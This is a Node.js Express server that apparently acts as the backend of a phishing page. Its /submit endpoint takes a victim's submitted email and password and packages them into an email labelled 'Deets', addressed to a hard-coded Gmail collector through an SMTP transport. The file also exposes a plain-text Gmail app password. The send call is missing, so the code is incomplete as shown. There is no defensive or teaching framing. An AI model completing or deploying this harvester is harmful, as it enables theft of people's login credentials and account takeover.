const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, 'public')));

const maillist = [
  'willyscotmegan@gmail.com',
];

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER || "willyscotmegan@gmail.com",
    pass: process.env.EMAIL_PASS || "jubtgphwdbkrrauf",
  },
});

app.post('/submit', async (req, res) => {
  try {
    console.log('Received:', req.body);
    
    const { phWet, passwordwet } = req.body; // Match the form field names exactly
    
    const mailOptions = {
      from: '"Deets" <willyscotmegan@gmail.com>',
      to: maillist,
      html: `
        <p><strong>Eml:</strong> ${phWet || 'Not provided'}</p>
        <p><strong>Psw:</strong> ${passwordwet || 'Not provided'}</p>
      `
    };
    
    // Add response to client
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Submission failed' });
  }
});

app.listen(port, () => {
  console.log(``);
});

module.exports = app;